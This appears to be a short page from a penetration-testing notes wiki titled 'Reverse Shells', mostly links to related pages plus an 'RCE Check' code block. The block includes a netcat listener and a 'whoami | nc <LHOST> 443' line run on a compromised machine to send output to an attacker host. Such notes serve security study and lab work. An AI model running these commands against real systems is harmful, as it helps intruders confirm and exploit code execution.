# 🎮 Reverse Shells

## Reverse Shells

{% content-ref url="web-shells.md" %}
[web-shells.md](web-shells.md)
{% endcontent-ref %}

{% content-ref url="../file-transfer/linux-file-transfer.md" %}
[linux-file-transfer.md](../file-transfer/linux-file-transfer.md)
{% endcontent-ref %}

{% content-ref url="windows-rev-shells.md" %}
[windows-rev-shells.md](windows-rev-shells.md)
{% endcontent-ref %}

## RCE Check

```bash
# tcpdump
tcpdump -i tun0 icmp # We can also test by disabling DNS resolution with -n
tcpdump ip proto \\icmp -i tun0
tshark -i tun0 -Y "icmp" 2>/dev/null
# ping
ping -c 1 <LHOST>
# nc
nc -nvlp 443 # Attacker machine
whoami | nc <LHOST> 443 # Compromised machine
# sleep
sleep 5 # Linux
timeout 5 # Windows
```

## Tools

{% content-ref url="pwncat.md" %}
[pwncat.md](pwncat.md)
{% endcontent-ref %}
